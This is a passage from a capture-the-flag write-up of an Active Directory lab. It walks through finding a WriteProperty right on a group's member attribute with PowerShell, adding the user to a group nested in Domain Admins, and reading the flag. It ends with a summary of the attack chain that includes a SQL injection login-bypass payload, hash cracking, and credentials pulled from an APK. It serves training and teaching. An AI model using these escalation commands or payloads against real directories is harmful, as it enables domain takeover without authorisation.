- Group name goes here: `Get-ADGroup '<redacted>'`
- Username goes here: `$_.IdentityReference -match '<redacted>'`

```powershell
 (Get-Acl "AD:$((Get-ADGroup '<redacted>').DistinguishedName)").Access | ? { $_.IdentityReference -match '<redacted>' }


ActiveDirectoryRights : WriteProperty
InheritanceType       : None
ObjectType            : bf9679c0-0de6-11d0-a285-00aa003049e2
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : DEADDROP\<redacted>
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
```

- `WriteProperty` (on `member` of Domain Admins), or
- the BloodHound edge name **`<redacted>`**

>[!Hint] Bloodhound vs manual work
>The room is expecting us to use Bloodhound. As I was using the provided attack box, I was not able to get the Bloodhound working. The concept is:
>- Use the Bloodhound-python to extract the data
>- then open the extracted data using BloodHound and analyse to identify the vulnerability
>This means that the answer is expecting a BloodHound format.

BINGO! we have the answer. It is just redacted here. ;-)
# Challenge 4 - What is the name of the group you target to escalate to Domain Admin?

We have a list of the groups from the previous step. We need to now identify which one can be used for privilege escalation.

Note that the `bf9679c0-0de6-11d0-a285-00aa003049e2` is "**Member attribute**" (https://learn.microsoft.com/en-us/windows/win32/adschema/a-member)

You may use the list of groups  identified earlier. We want to be domain admin, so the group name "Domain Admins" is important here:

```powershell
# Is <redacted> a member of Domain Admins?
Get-ADGroupMember "Domain Admins" | ? { $_.SamAccountName -eq '<redacted>' }

# Or look from the other side - what is <redacted> nested into?
Get-ADGroup "<redacted>" -Properties memberOf | select -expand memberOf
```

The result should look like this: 

```powershell
CN=Domain Admins,CN=Users,DC=deaddrop,DC=loc
```

BINGO! we have identified the group name. One of the group names from the list is the answer. This group is a member of the "Domain Admins". Identify that group.
# Challenge 5 - What is the flag on the Domain Controller?
To get the flag, we need to actually escalate the user's privileges. We already know from the previous challenge the group method and the group name. Here, we just need to execute that:

Add your user to that specific group:

```powershell
Add-ADGroupMember -Identity "<redacted group name>" -Members <redacted username>
```

We need to logoff then log back in for the change to take effect, as you can see the user is still not showing up as a member of the group:

```
whoami /groups | findstr /i "Domain Admins"
DEADDROP\Domain Admins                          Group            S-1-5-21-2304234032-2319324522-87291130-512 Group used for deny only
```

```
GROUP INFORMATION
-----------------

Group Name                                      Type             SID                                         Attributes 
=============================================== ================ =========================================== ===============================================================
Everyone                                        Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                   Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access      Alias            S-1-5-32-554                                Group used for deny only
BUILTIN\Administrators                          Alias            S-1-5-32-544                                Group used for deny only
NT AUTHORITY\REMOTE INTERACTIVE LOGON           Well-known group S-1-5-14                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                        Well-known group S-1-5-4                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                  Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
LOCAL                                           Well-known group S-1-2-0                                     Mandatory group, Enabled by default, Enabled group
DEADDROP\Domain Admins                          Group            S-1-5-21-2304234032-2319324522-87291130-512 Group used for deny only
Authentication authority asserted identity      Well-known group S-1-18-1                                    Mandatory group, Enabled by default, Enabled group
DEADDROP\Denied RODC Password Replication Group Alias            S-1-5-21-2304234032-2319324522-87291130-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level          Label            S-1-16-8192                                            
```

Logoff and log back in and check again and the new group we've added must be listed now in the user's groups:

```
C:\Users\<redacted>>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                      Type             SID                                          Attributes
=============================================== ================ ============================================ ===============================================================

DEADDROP\<redacted>                      Group            S-1-5-21-2304234032-2319324522-87291130-1104 Mandatory group, Enabled by default, Enabled group
              
```

The flag is in the administrator's desktop. Read it:

```
C:\Users\<redacted>>cd c:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

05/11/2026  06:10 AM    <DIR>          .
05/11/2026  06:10 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/19/2026  08:37 PM                29 flag.txt
               3 File(s)          1,110 bytes
               2 Dir(s)  14,323,924,992 bytes free

C:\Users\Administrator\Desktop>type flag.txt
THM{d34d_...}

```

BINGO! We have the flag for the final challenge.

## Cleanup - Rules of Engagement
`Add-ADGroupMember` is a **persistent change to production AD**, which the RoE placed *out of scope* ("modifying or deleting data on production systems"). In a real engagement you'd note the exception, get sign-off, and revert as soon as the objective is proven:

```powershell
Remove-ADGroupMember -Identity "<redacted>" -Members <redacted> -Confirm:$false
```

Leaving the group membership in place would be both a scope breach and a lingering backdoor.

# Methodology (the full chain)

```
SQLi login bypass  (' OR 1=1--)         ──►  authenticated dashboard (as "admin")
        │
        ├─ loot: shadow.bak, passwd, deaddrop.db, deaddrop-mobile.apk, planted shells
        │
        ▼
Crack svc-drop hash from shadow.bak     ──►  SSH to web server      ►  CHALLENGE 1
        │
        ▼
Decompile the mobile APK (jadx)         ──►  hard-coded creds       ►  CHALLENGE 2
        │
        ▼
SSH SOCKS tunnel → RDP to the DC
  (creds reused from the APK)
        │
        ▼
Find the privileges (manually or using BloodHound) ──►  Specific Attribute  ►  CHALLENGE 3
        │
        ▼
Find the group with admin privilege (manually or using BloodHound) ──►  Specific Group  ► CHALLENGE 4
  add self to a group that is nested in Domain Admins
        │
        ▼
Read Administrator desktop flag          ►  CHALLENGE 5
```
